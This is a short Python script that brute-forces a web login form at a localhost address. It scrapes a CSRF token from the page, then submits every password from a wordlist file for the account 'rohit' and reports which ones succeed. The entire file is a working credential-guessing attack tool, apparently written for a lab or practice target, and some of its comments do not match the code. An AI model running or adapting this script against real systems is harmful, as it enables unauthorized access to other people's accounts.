import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re

re_csrf = 'csrfMagicToken = "(.*?)"'

s = requests.session()  #to set cookies 
#requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

f = open('password.txt','r')

for password in f:
    r = s.get('http://127.0.0.1/index.php') #verify here tells to ignore ssl certification
    csrf = re.findall(re_csrf,r.text)[0]

    login = {'__csrf_magic' :csrf ,'usernmaefld':'rohit','passwordfld':password[:-1],'login':'Login'}
    r = s.post('http://127.0.0.1/index.php',data=login)
    if 'Dashboard' in r.text:
        print('Valid Login %s:%s'%('rohit',password[:-1]))

    else:
        print('Failed %s:%s'%('rohit',password[:-1]))
        s.cookies.clear()

#print(r.text)
#print(csrf)
